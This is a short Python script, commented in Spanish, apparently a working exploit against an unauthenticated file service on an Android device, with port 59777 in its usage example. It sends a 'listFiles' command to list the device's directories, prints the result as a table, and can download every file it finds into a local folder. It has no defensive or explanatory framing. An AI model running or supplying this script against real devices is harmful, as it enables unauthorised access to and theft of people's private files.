import requests
from optparse import OptionParser
import urllib3
import json,ast,os
from clint.textui import progress
import pandas as pd



list_action = ["ListFiles"]
class Exploit():
    """
    Ejemplo:

    Para Escanear o descargar:
        - python3 --ip 10.10.10.247 --port 59777 --action scan --dir /
        - python3 --ip 10.10.10.247 --port 59777 --action download --dir sdcard
    
    """
    def parser_args(self):
        parser = OptionParser()
        parser.add_option("-i", "--ip", dest="ip", help="Dirección IP del host a analizar")
        parser.add_option("-p", "--port", dest="port", help="Puerto del host")
        parser.add_option("-a", "--action", dest="action", help="Determina la acción a  realizar (scan o download)")
        parser.add_option("-d", "--dir", dest="directory", help="Directorio para analizar o descargar (para el directorio raiz [/])")
        #(options, args) = parser.parse_args()
        return parser.parse_args()
    

    def scan_directory(self, ip, port, directory):
        if directory == "/":
            url = 'http://' + ip + ":" + port + "/"
        else:
            url = 'http://' + ip + ":" + port + "/" + directory
        r = requests.post(
          url,
          headers={'Content-Type': 'application/json'},
          data='{command:listFiles}',
        )
        text = r.text
        data = ast.literal_eval(text)
        #list_keys = data[0].keys()
        return data

    def download_file(self, data, ip, port, directory):
        for d in data:
            if d["type"] == "file":
                print("Descargando archivo, ", d["name"])
                if directory == "/":
                    url = 'http://' + ip + ':' + port + '/' + d["name"]
                    if not os.path.exists('./android/'):
                        os.mkdir("./android/")
                    file = requests.get(url, allow_redirects=True)
                    with open("./android/" + directory + "/" + d["name"], 'wb') as f:
                        for ch in file:
                            if ch:
                                f.write(ch)

                else:
                    url = 'http://' + ip + ':' + port + '/' + directory + '/' + d["name"]
                    if not os.path.exists('./android/' + directory):
                        os.makedirs("./android/" + directory)

                    file = requests.get(url, allow_redirects=True)
                    with open("./android/" + directory + "/" + d["name"], 'wb') as f:
                        for ch in file:
                            if ch:
                                f.write(ch)
            

    def data_frame(self, data):
        #for d in data
        df = pd.DataFrame(data)
        return df
        
if __name__ == '__main__':
    exploit = Exploit()
    (options, args) = exploit.parser_args()
    if options.action == "scan":
        data = exploit.scan_directory(options.ip, options.port, options.directory)
        df = exploit.data_frame(data)
        print(df)
    if options.action == "download":
        data = data = exploit.scan_directory(options.ip, options.port, options.directory)
        exploit.download_file(data, options.ip, options.port, options.directory)
    
